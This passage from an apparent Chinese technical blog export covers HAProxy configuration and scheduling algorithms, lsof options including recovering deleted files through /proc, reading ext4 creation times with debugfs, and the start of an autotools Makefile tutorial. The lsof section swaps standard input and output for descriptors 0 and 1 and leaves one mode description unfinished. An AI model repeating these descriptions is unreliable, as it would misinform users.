3000</span><br></pre></td></tr></table></figure><ul><li><p><code>mode</code>：</p><ul><li><code>http</code>：七层模式；</li><li><code>tcp</code>：四层模式；</li><li><code>health</code>：健康检测；</li></ul></li><li><p><code>log</code>：日志输出设置；</p></li><li><p><code>retries</code>：定义连接后端服务器的失败重连次数，连接失败超过此值后会将对应后端服务器标记不可用；</p></li><li><p><code>option</code>：</p><ul><li><code>httplog</code>：启用日志记录HTTP请求，默认不记录HTTP请求日志；</li><li><code>tcplog</code>：启用日志记录TCP请求，默认不记录TCP请求日志；</li><li><code>redispatch</code>：当使用了cookie时，haproxy将会将其请求的后端服务器的serverID插入到cookie中，以保证会话的session的持久性，如果后端的服务器宕掉了，但是客户端的cookie是不会刷新的，如果设置此参数，将会将客户的请求强制定向到另外一个后端server上，以保证服务的正常；</li><li><code>abortonclose</code>：当服务器负载很高的时候，自动结束掉当前队列处理比较久的链接；</li><li><code>dontlognull</code>：启用该项，日志中将不会记录空连接。所谓空连接就是在上游的负载均衡器或者监控系统为了探测该服务是否存活可用时，需要定期的连接或者获取某一固定的组件或页面，或者探测扫描端口是否在监听或开放等动作被称为空连接；官方文档中标注，如果该服务上游没有其他的负载均衡器的话，建议不要使用该参数，因为互联网上的恶意扫描或其他动作就不会被记录下来；</li></ul></li><li><p><code>timeout connect</code>：设置成功连接到一台服务器的最长等待时间，默认单位是毫秒，老版本使用<code>contimeout</code>替代；</p></li><li><p><code>timeout client</code>：设置连接客户端发送数据时的成功连接最长等待时间，默认单位是毫秒，老版本使用<code>clitimeout</code>替代；</p></li><li><p><code>timeout server</code>：设置服务器端回应客户度数据发送的最长等待时间，默认单位是毫秒，老版本使用<code>srvtimeout</code>替代；</p></li></ul><h4 id="2-4-3、listen配置"><a href="#2-4-3、listen配置" class="headerlink" title="2.4.3、listen配置"></a>2.4.3、listen配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listen <span class="built_in">test</span></span><br><span class="line">     <span class="built_in">bind</span> 0.0.0.0:1080</span><br><span class="line">     mode tcp</span><br><span class="line">     option tcplog</span><br><span class="line">     maxconn 2000</span><br><span class="line">     <span class="built_in">timeout</span> connect 5000</span><br><span class="line">     <span class="built_in">timeout</span> client  50000</span><br><span class="line">     <span class="built_in">timeout</span> server  50000</span><br><span class="line">     option tcp-check</span><br><span class="line">     server HTTPS1 192.0.2.1:443 ssl verify none socks4 127.0.0.1:1080 check inter 30000 fastinter 1000</span><br><span class="line">     server HTTPS2 192.0.2.2:443 ssl verify none                       check inter 30000 fastinter 1000 backup</span><br></pre></td></tr></table></figure><p>部分参数同default的含义，以下只说明部分参数：</p><ul><li><code>server</code>：<ul><li><code>name</code>：名称；</li><li><code>weight</code>：服务器的权重；</li><li><code>check</code>：允许对该服务器进行健康检查；</li><li><code>inter</code>：设置连续的两次健康检查之间的时间，单位为毫秒(ms)，默认值 2000(ms)；</li><li><code>rise</code>：指定多少次成功的健康检查后，即可认定该服务器处于可用状态，默认值 2；</li><li><code>fall</code>：指定多少次不成功的健康检查后，认为服务器为不可用状态，默认值 3；</li><li><code>maxconn</code>：指定可被发送到该服务器的最大并发连接数；</li></ul></li></ul><p><strong>更多详细的配置文档位于源码包的<code>./examples/configuration.txt</code>文件中，也可<a href="http://www.haproxy.org/download/2.1/doc/configuration.txt">在线查看(2.1.2配置文档)</a>；</strong></p><h3 id="2-5、调度算法"><a href="#2-5、调度算法" class="headerlink" title="2.5、调度算法"></a>2.5、调度算法</h3><ul><li><code>roundrobin</code>：基于权重进行轮询，在服务器的处理时间保持均匀分布时，这是最平衡、最公平的算法；</li><li><code>static-rr</code>：基于权重进行轮询；</li><li><code>first</code>：第一个具有可用连接槽的服务器得到连接。这些服务器将从最小到最大的<code>id</code>选择，一旦一个服务器到达它的最大连接数，下一个服务器将被使用；如果不定义每个服务器的<code>maxconn</code>参数，这个算法是无意义的。使用这个算法的目的是尽量使用最小数量的服务器以便于其他服务器可以在非密集时段待机。这个算法将忽略服务器权重；</li><li><code>leastconn</code>：新的连接请求被派发至具有最少连接数目的后端服务器，在有着较长时间会话的场景中推荐使用此算法，如<code>LDAP</code>、<code>SQL</code>等；其并不太适用于较短会话的应用层协议，如<code>HTTP</code>；</li><li><code>random</code>：基于一个随机数作为一致性hash的key，随机负载平衡对于大型服务器场或经常添加或删除服务器非常有用，因为它可以避免在这种情况下由<code>roundrobin</code>或<code>leastconn</code>导致的<a href="%5Bhttps://zh.wikipedia.org/zh/%E6%B0%B4%E9%8C%98%E4%BD%9C%E7%94%A8%5D(https://zh.wikipedia.org/zh/%E6%B0%B4%E9%8C%98%E4%BD%9C%E7%94%A8)">水锤效应</a>；</li><li><code>source</code>：将请求的源地址进行hash运算，并由后端服务器的权重总数相除后派发至某匹配的服务器，这可以使得同一个客户端IP的请求始终被派发至某特定的服务器。不过当服务器权重总数发生变化时，如某服务器宕机或添加了新的服务器，许多客户端的请求可能会被派发至与此前请求不同的服务器。常用于负载均衡无<code>cookie</code>功能的基于<code>TCP</code>的协议；</li><li><code>uri</code>：对URI进行hash运算，并由服务器的总权重相除后派发至某匹配的服务器。这可以使得对同一个<code>URI</code>的请求总是被派发至某特定的服务器，除非服务器的权重总数发生了变化。此算法常用于代理缓存或反病毒代理以提高缓存的命中率。需要注意的是，此算法仅应用于HTTP后端服务器场景；</li><li><code>url_param</code>：通过&lt; argument&gt;为URL指定的参数在每个HTTP GET请求中将会被检索，如果找到了指定的参数且其通过等于号”&#x3D;”被赋予了一个值，那么此值将被执行hash运算并被服务器的总权重相除后派发至某匹配的服务器。此算法可以通过追踪请求中的用户标识进而确保同一个用户ID的请求将被送往同一个特定的服务器，除非服务器的总权重发生了变化。如果某请求中没有出现指定的参数或其没有有效值，则使用轮叫算法对相应请求进行调度；</li><li><code>hdr(name)</code>：对于每个<code>HTTP</code>请求，通过<code>&lt; name&gt;</code>指定的<code>HTTP</code>首部将会被检索。如果相应的首部没有出现或其没有有效值，则使用轮询算法对相应请求进行调度.其有一个可选选项<code>use_domain_only</code>，可在指定检索类似Host类的首部时仅计算域名部分(比如通过<code>www.bugwz.com</code>来说，仅计算<code>bugwz</code>字符串的hash值)以降低hash算法的运算量；</li><li><code>rdp-cookie(name)</code>：根据<code>cookie(name)</code>来锁定并哈希每一次<code>TCP</code>请求；</li></ul><p>参考地址：</p><ul><li><a href="http://vlambda.com/wz_5gLxSJYWQfp.html">http://vlambda.com/wz_5gLxSJYWQfp.html</a></li><li><a href="https://www.cnblogs.com/f-ck-need-u/p/8540805.html">https://www.cnblogs.com/f-ck-need-u/p/8540805.html</a></li><li><a href="http://blog.xiayf.cn/gitbook/tech-note/operation/haproxy.html">http://blog.xiayf.cn/gitbook/tech-note/operation/haproxy.html</a></li><li><a href="https://blog.51cto.com/leejia/1421882">https://blog.51cto.com/leejia/1421882</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> HAProxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lsof指令的使用 - 每周指令</title>
      <link href="/2019/12/12/command-lsof/"/>
      <url>/2019/12/12/command-lsof/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>lsof（list open files）</code>是一个列出当前系统打开文件的工具。在Linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。</p><h2 id="二、参数解析"><a href="#二、参数解析" class="headerlink" title="二、参数解析"></a>二、参数解析</h2><p>使用的版本为<code>4.8.2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a：列出打开文件存在的进程；</span><br><span class="line">-c&lt;进程名&gt;：列出指定进程所打开的文件；</span><br><span class="line">-g：列出GID号进程详情；</span><br><span class="line">-d&lt;文件号&gt;：列出占用该文件号的进程；</span><br><span class="line">-n&lt;目录&gt;：列出使用NFS的文件；</span><br><span class="line">-i&lt;条件&gt;：列出符合条件的进程(4、6、协议、:端口、 @ip )；</span><br><span class="line">-p&lt;进程号&gt;：列出指定进程号所打开的文件；</span><br><span class="line">-R：列出父进程的pid；</span><br><span class="line">-u：列出UID号进程详情；</span><br><span class="line">-h：显示帮助信息；</span><br><span class="line">-v：显示版本信息；</span><br></pre></td></tr></table></figure><p><strong>各列的含义解释：</strong></p><ul><li><code>COMMAND</code>：进程的名称；</li><li><code>PID</code>：进程标识符；</li><li><code>PPID</code>：父进程标识符(需要指定-R参数)；</li><li><code>PGID</code>：进程组的ID编号(需要指定-g参数)；</li><li><code>USER</code>：进程所有者；命令的执行UID或系统中登陆的用户名称。默认显示为用户名，当使用-l参数时，可显示<code>UID</code>。</li><li><code>FD</code>：文件描述符，应用程序通过文件描述符识别该文件；<ul><li><code>cwd</code>：表示current work dirctory，即应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改；</li><li><code>txt</code>：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 &#x2F;sbin&#x2F;init 程序；</li><li><code>lnn</code>：表示library references (AIX)，即库引用；</li><li><code>er</code>：表示FD information error (see NAME column)，即FD错误信息；</li><li><code>ltx</code>：表示shared library text (code and data)，即共享库文本；</li><li><code>mxx</code>：表示hex memory-mapped type number xx，即十六进制内存映射类型号xx；</li><li><code>m86</code>：表示DOS Merge mapped file，即DOS合并映射文件；</li><li><code>mem</code>：表示memory-mapped file，即内存映射文件；</li><li><code>mmap</code>：表示memory-mapped device，即内存映射设备；</li><li><code>pd</code>：表示parent directory，即父目录；</li><li><code>rtd</code>：表示root directory，即根目录；</li><li><code>v86</code>：表示VP&#x2F;ix mapped file，即VP&#x2F;ix映射文件；</li><li><code>0</code>：表示标准输出；</li><li><code>1</code>：表示标准输入；</li><li><code>2</code>：表示标准错误；<ul><li><strong>一般在标准输出、标准错误、标准输入后还跟着文件状态模式：r、w、u等：</strong></li><li><code>u</code>：表示该文件被打开并处于读取&#x2F;写入模式</li><li><code>r</code>：表示该文件被打开并处于只读模式</li><li><code>w</code>：表示该文件被打开并处于</li><li><code>空格</code>：表示该文件的状态模式为unknow，且没有锁定</li><li><code>-</code>：表示该文件的状态模式为unknow，且被锁定<ul><li><strong>同时在文件状态模式后面，还跟着相关的锁</strong></li><li><code>N</code>：for a Solaris NFS lock of unknown type（对于未知类型的Solaris NFS锁）；</li><li><code>r</code>：for read lock on part of the file（文件部分的读锁）；</li><li><code>R</code>：for a read lock on the entire file（整个文件的读锁）；</li><li><code>w</code>：for a write lock on part of the file（文件的部分写锁）；</li><li><code>W</code>：for a write lock on the entire file（整个文件的写锁）；</li><li><code>u</code>：for a read and write lock of any length（对于任何长度的读写锁）；</li><li><code>U</code>：for a lock of unknown type（对于未知类型的锁）；</li><li><code>x</code>：for an SCO OpenServer Xenix lock on part of the file（对于部分文件的SCO OpenServer Xenix锁）；</li><li><code>X</code>：for an SCO OpenServer Xenix lock on the entire file（对于整个文件的SCO OpenServer Xenix锁）；</li><li><code>space</code>：if there is no lock（没有锁）；</li></ul></li></ul></li></ul></li><li><code>TYPE</code>：<ul><li><code>CHR</code>：字符类型；</li><li><code>REG</code>：文件类型；</li><li><code>DIR</code>：目录；</li><li><code>BLK</code>：块设备类型；</li><li><code>LINK</code>：链接文件；</li><li><code>FIFO</code>：先进先出 (FIFO) 队列；</li><li><code>IPv4</code>：IPv4的包；</li><li><code>IPv6</code>：IPv6的包，即使地址是IPv4的，也会显示为IPv6，而映射到IPv6的地址；</li><li><code>0000</code>：</li><li><code>unix</code>：</li></ul></li><li><code>DEVICE</code>：使用character special、block special表示的磁盘名称；</li><li><code>SIZE/OFF</code>：文件的大小，如果不能用大小表示的，会留空。使用<code>-s</code>参数控制；</li><li><code>NODE</code>：本地文件的node码，或者协议，如TCP等；</li><li><code>NAME</code>：挂载点和文件的全路径（链接会被解析为实际路径），或者连接双方的地址和端口、状态等；</li></ul><h2 id="三、使用技巧"><a href="#三、使用技巧" class="headerlink" title="三、使用技巧"></a>三、使用技巧</h2><h3 id="3-1、恢复已经删除的文件"><a href="#3-1、恢复已经删除的文件" class="headerlink" title="3.1、恢复已经删除的文件"></a>3.1、恢复已经删除的文件</h3><p>当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点，具体恢复步骤如下所示：</p><ul><li><p>找到指定的已经被删除的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz ~]<span class="comment"># lsof -R /data1 | grep deleted</span></span><br><span class="line"><span class="built_in">test</span> 16578    1 nosql   11r   REG 253,17 2400000683 39846050 /data/test.log (deleted)</span><br></pre></td></tr></table></figure></li><li><p>依据进程的pid（16578）和文件的fd的id（11）信息，找到指定的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz ~]<span class="comment"># ll /proc/16578/fd/11</span></span><br><span class="line">lr-x------ 1 root root 64 Dec 12 12:20 /proc/16578/fd/11 -&gt; /data/test.log (deleted)</span><br></pre></td></tr></table></figure></li><li><p>尝试查看该文件中的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz ~]<span class="comment"># head -n 1 /proc/16578/fd/11</span></span><br><span class="line">[16578] 12 Dec 12:20:00 * Start <span class="built_in">test</span> process...</span><br></pre></td></tr></table></figure></li><li><p>尝试恢复该文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz /]<span class="comment"># cat /proc/16578/fd/11 &gt; /data/test.log</span></span><br><span class="line">[root@bugwz /]<span class="comment"># ll /data/</span></span><br><span class="line">total 2400000683</span><br><span class="line">-rw-r--r-- 1 root  root  2400000683 Dec 12 14:17 test.log</span><br><span class="line">[root@bugwz /]<span class="comment"># head -n 1 /proc/16578/fd/11</span></span><br><span class="line">[16578] 12 Dec 12:20:00 * Start <span class="built_in">test</span> process...</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> lsof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下查看文件的创建时间</title>
      <link href="/2019/12/12/linux-ext4-crtime/"/>
      <url>/2019/12/12/linux-ext4-crtime/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>Linux</code>的文件能否找到文件的创建时间取决于文件系统类型，在<a href="https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout">ext4</a>之前的早期文件系统中（<code>ext</code>、<code>ext2</code>、<code>ext3</code>），文件的元数据不会记录文件的创建时间，它只会记录访问时间、修改时间、更改时间（状态更改时间）。典型的文件的基础信息如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz ～]<span class="comment"># stat test.file</span></span><br><span class="line">  File: ‘test.file’</span><br><span class="line">  Size: 2         Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 807h/2055dInode: 5255117     Links: 1</span><br><span class="line">Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2019-12-12 19:11:33.175841399 +0800</span><br><span class="line">Modify: 2019-12-12 19:11:37.564970487 +0800</span><br><span class="line">Change: 2019-12-12 19:11:43.079132663 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure><ul><li><code>Access</code>：访问时间，文件数据的最后访问时间（例如：读文件内容）；</li><li><code>Modify</code>：修改时间，文件数据的最后修改时间。（例如：修改文件内容）；</li><li><code>Change</code>：状态更改时间，这个跟 Modify 时间很容易混淆，文件的属性（权限，大小等）的变更时间；</li></ul><h2 id="二、实践"><a href="#二、实践" class="headerlink" title="二、实践"></a>二、实践</h2><h3 id="2-1、获取文件的创建时间"><a href="#2-1、获取文件的创建时间" class="headerlink" title="2.1、获取文件的创建时间"></a>2.1、获取文件的创建时间</h3><ul><li>获取文件<code>inode</code>号，如下所示，拿到<code>inode</code>号为：<code>5255117</code>；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># stat /data/test.file</span></span><br><span class="line">  File: ‘/data/test.file’</span><br><span class="line">  Size: 2         Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 807h/2055dInode: 5255117     Links: 1</span><br><span class="line">Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Access: 2019-12-12 19:11:33.175841399 +0800</span><br><span class="line">Modify: 2019-12-12 19:11:37.564970487 +0800</span><br><span class="line">Change: 2019-12-12 19:11:43.079132663 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure><ul><li>查找文件所在的磁盘路径，如下所示，拿到磁盘路径为：<code>/dev/sda7</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># df -h</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/sda3       3.9G  2.5G  1.2G  70% /</span><br><span class="line">devtmpfs         16G     0   16G   0% /dev</span><br><span class="line">tmpfs            16G     0   16G   0% /dev/shm</span><br><span class="line">tmpfs            16G  1.7G   14G  11% /run</span><br><span class="line">tmpfs            16G     0   16G   0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1        12G   11G  787M  94% /usr</span><br><span class="line">/dev/sda5       7.8G  4.2G  3.2G  57% /tmp</span><br><span class="line">/dev/sda7       235G  180G   44G  81% /data</span><br><span class="line">/dev/sda6       7.8G  2.1G  5.3G  29% /var</span><br></pre></td></tr></table></figure><ul><li>使用<code>debugfs</code>查看文件的创建时间，发现创建时间<code>crtime</code>为：<code>Thu Dec 12 19:05:23 2019</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data1]<span class="comment"># debugfs -R &#x27;stat &lt;5255117&gt;&#x27; /dev/sda7</span></span><br><span class="line">debugfs 1.42.9 (28-Dec-2013)</span><br><span class="line">Inode: 5255117   Type: regular    Mode:  0755   Flags: 0x80000</span><br><span class="line">Generation: 758605841    Version: 0x00000000:00000001</span><br><span class="line">User:     0   Group:     0   Size: 2</span><br><span class="line">File ACL: 0    Directory ACL: 0</span><br><span class="line">Links: 1   Blockcount: 8</span><br><span class="line">Fragment:  Address: 0    Number: 0    Size: 0</span><br><span class="line"> ctime: 0x5df2206f:12dddfdc -- Thu Dec 12 19:11:43 2019</span><br><span class="line"> atime: 0x5df22065:29ec81dc -- Thu Dec 12 19:11:33 2019</span><br><span class="line"> mtime: 0x5df22069:86b30fdc -- Thu Dec 12 19:11:37 2019</span><br><span class="line">crtime: 0x5df21ef3:d586ca44 -- Thu Dec 12 19:05:23 2019</span><br><span class="line">Size of extra inode fields: 28</span><br><span class="line">EXTENTS:</span><br><span class="line">(0):16949121</span><br></pre></td></tr></table></figure><h3 id="2-2、集成脚本："><a href="#2-2、集成脚本：" class="headerlink" title="2.2、集成脚本："></a>2.2、集成脚本：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">[ <span class="variable">$#</span> -ne 1 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;Usage:     <span class="variable">$0</span> &#123;FILENAME&#125;&quot;</span> &amp;&amp; <span class="built_in">exit</span> 1</span><br><span class="line"></span><br><span class="line">INODE=`<span class="built_in">ls</span> -i <span class="variable">$1</span> |awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">FILENAME=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果传入参数带/，则获取这个传入参数的目录路径并进入目录</span></span><br><span class="line">`<span class="built_in">echo</span> <span class="variable">$FILENAME</span> | grep / 1&gt; /dev/null`  &amp;&amp;  &#123; FPWD=<span class="variable">$&#123;FILENAME%/*&#125;</span>;FPWD=<span class="variable">$&#123;FPWD:=/&#125;</span>;<span class="built_in">cd</span> <span class="variable">$&#123;FPWD&#125;</span>;FPWD=`<span class="built_in">pwd</span>`; &#125;  || FPWD=`<span class="built_in">pwd</span>`</span><br><span class="line"></span><br><span class="line">array=(`<span class="built_in">echo</span> <span class="variable">$&#123;FPWD&#125;</span> | sed <span class="string">&#x27;s@/@ @g&#x27;</span>`)</span><br><span class="line">array_length=<span class="variable">$&#123;#array[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="variable">$&#123;array_length&#125;</span>;i&gt;=0;i--)); <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">unset</span> array[<span class="variable">$i</span>]</span><br><span class="line">  SUBPWD=`<span class="built_in">echo</span> <span class="string">&quot; &quot;</span><span class="variable">$&#123;array[@]&#125;</span> | sed <span class="string">&#x27;s@ @/@g&#x27;</span>`</span><br><span class="line">  DISK=`<span class="built_in">df</span> -h |grep <span class="variable">$&#123;SUBPWD&#125;</span>$ |awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">  [[ -n <span class="variable">$DISK</span> ]] &amp;&amp; <span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件系统非ext4则退出</span></span><br><span class="line">[[ <span class="string">&quot;`df -T | grep <span class="variable">$&#123;DISK&#125;</span> |awk &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;`&quot;</span> != <span class="string">&quot;ext4&quot;</span> ]] &amp;&amp; &#123; <span class="built_in">echo</span> <span class="variable">$&#123;DISK&#125;</span> is not mount on <span class="built_in">type</span> ext4! Only ext4 file system support!;<span class="built_in">exit</span> 2; &#125;</span><br><span class="line"></span><br><span class="line">debugfs -R <span class="string">&quot;stat &lt;<span class="variable">$&#123;INODE&#125;</span>&gt;&quot;</span> <span class="variable">$&#123;DISK&#125;</span></span><br></pre></td></tr></table></figure><p>参考地址：<a href="https://www.qingtingip.com/h_375642.html">https://www.qingtingip.com/h_375642.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> debugfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下Makefile的生成之路</title>
      <link href="/2019/12/11/makefile/"/>
      <url>/2019/12/11/makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="一、流程介绍"><a href="#一、流程介绍" class="headerlink" title="一、流程介绍"></a>一、流程介绍</h2><p><img src="https://cdn.bugwz.com/makefile-map.png" alt="Makefile文件的完成流程图 "></p><ul><li><p><code>autoscan</code>：通过扫描源代码来搜寻普通的可移植性问题，比如检查编译器，库，头文件等，生成文件<code>configure.scan</code>，它是<code>configure.ac</code>的一个雏形；</p></li><li><p><code>aclocal</code>：根据已经安装的宏，用户定义宏和<code>acinclude.m4</code>文件中的宏将<code>configure.ac</code>文件所需要的宏集中定义到文件 <code>aclocal.m4</code>中，<code>aclocal</code>是一个<code>perl</code> 脚本程序，完整定义为：<code>aclocal - create aclocal.m4 by scanning configure.ac</code>；</p></li><li><p><code>automake</code>：将<code>Makefile.am</code>中定义的结构建立<code>Makefile.in</code>；</p></li><li><p><code>autoheader</code>：生成了<code>configure.h.in</code>（如果<code>configure.ac</code>中定义了AC_CONFIG_HEADER，那么此文件则必须存在）；</p></li><li><p><code>autoconf</code>：将<code>configure.ac</code>中的宏展开，生成<code>configure</code>脚本。这个过程可能要用到<code>aclocal.m4</code>中定义的宏；</p></li><li><p><code>configure脚本</code>：将生成的<code>Makefile.in</code>文件转换为<code>Makefile</code>；</p></li></ul><h2 id="二、流程实战"><a href="#二、流程实战" class="headerlink" title="二、流程实战"></a>二、流程实战</h2><h3 id="2-1、环境准备"><a href="#2-1、环境准备" class="headerlink" title="2.1、环境准备"></a>2.1、环境准备</h3><p>安装依赖的软件包<a href="https://www.gnu.org/software/automake/manual/automake.html">automake</a>与<a href="https://www.gnu.org/savannah-checkouts/gnu/autoconf/manual/autoconf-2.69/index.html">autoconf</a>；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install automake autoconf</span><br></pre></td></tr></table></figure><ul><li><code>automake</code>：包括<code>aclocal</code>、<code>automake</code>等；</li><li><code>autoconf</code>：包括<code>autoscan</code>、<code>autoconf</code>等</li></ul><h3 id="2-2、基础文件"><a href="#2-2、基础文件" class="headerlink" title="2.2、基础文件"></a>2.2、基础文件</h3><p>文件<code>main.c</code>：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello world!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3、autoscan"><a href="#2-3、autoscan" class="headerlink" title="2.3、autoscan"></a>2.3、autoscan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 84 Dec 10 15:47 main.c</span><br><span class="line">[root@bugwz data]<span class="comment"># autoscan</span></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root root   0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root 466 Dec 10 15:48 configure.scan</span><br><span class="line">-rw-r--r-- 1 root root  84 Dec 10 15:47 main.c</span><br></pre></td></tr></table></figure><h3 id="2-4、aclocal"><a href="#2-4、aclocal" class="headerlink" title="2.4、aclocal"></a>2.4、aclocal</h3><p>将<code>configure.scan</code>文件修改为<code>configure.ac</code>文件；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bugwz data]<span class="comment"># mv configure.scan configure.ac</span></span><br><span class="line">[root@bugwz data]<span class="comment"># ll</span></span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root root   0 Dec 10 15:48 autoscan.log</span><br><span class="line">-rw-r--r-- 1 root root 466 Dec 10 15:48 configure.ac</span><br><span class="line">-rw-r--r-- 1 root root  84 Dec 10 15:47 main.c</span><br></pre></td></tr></table></figure><p>结合实际信息修改<code>configure.ac</code>文件的内容；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#                                               -*- Autoconf -*-</span></span><br><span class="line"><span class="comment"># Process this file with autoconf to produce a configure script.</span></span><br><span class="line"></span><br><span class="line">AC_PREREQ([2.69])</span><br><span class="line">AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS])</span><br><span class="line">AC_CONFIG_SRCDIR([main.c])</span><br><span class="line">AC_CONFIG_HEADERS([config.h])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for programs.</span></span><br><span class="line">AC_PROG_CC</span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for libraries.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for header files.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for typedefs, structures, and compiler characteristics.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for library functions.</span></span><br><span class="line"></span><br><span class="line">AC_OUTPUT</span><br></pre></td></tr></table></figure><p>具体解释为：</p><ul><li><p><code>AC_PREREQ</code>：宏声明本文件要求的<code>autoconf</code>版本，本例使用的版本为2.69；</p><ul><li><code>AC_INIT</code>：宏用来定义软件的名称和版本等信息；</li><li><code>FULL-PACKAGE-NAME</code>：软件包名称；</li><li><code>VERSION</code>：软件版本号；</li><li><code>BUG-REPORT-ADDRESS</code>：BUG报告地址（一般为软件作者邮件地址）；</li></ul></li><li><p><code>AC_CONFIG_SRCDIR</code>：宏用来侦测所指定的源码文件是否存在，来确定源码目录的有效性。此处为当前目录下的main.c；</p></li><li><p><code>AC_CONFIG_HEADER</code>：宏用于生成<code>config.h</code>文件，以便<code>autoheader</code>使用；</p></li><li><p><code>AC_PROG_CC</code>：用来指定编译器，如果不指定，选用默认<code>gcc</code>；</p></li><li><p><code>AC_OUTPUT</code>：用来设定 <code>configure</code> 所要产生的文件，如果是<code>makefile</code>，<code>configure</code>会把它检查出来的结果带入<code>makefile.in</code>文件产生合适的<code>makefile</code>。使用<code>automake</code>时，还需要一些其他的参数，这些额外的宏用<code>aclocal</code>工具产生；</p></li></ul><p>修改后的<code>configure.ac</code>文件内容为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#                                               -*- Autoconf -*-</span></span><br><span class="line"><span class="comment"># Process this file with autoconf to produce a configure script.</span></span><br><span class="line"></span><br><span class="line">AC_PREREQ([2.69])</span><br><span class="line">AC_INIT(helloworld, 1.0, admin@bugwz.com)</span><br><span class="line">AM_INIT_AUTOMAKE(helloworld, 1.0)</span><br><span class="line">AC_CONFIG_SRCDIR([main.c])</span><br><span class="line">AC_CONFIG_HEADERS([config.h])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Checks for programs.</span></span><br><span class="line">AC_PROG_CC</span><br><span class="line"></span><br><span class="line"><span 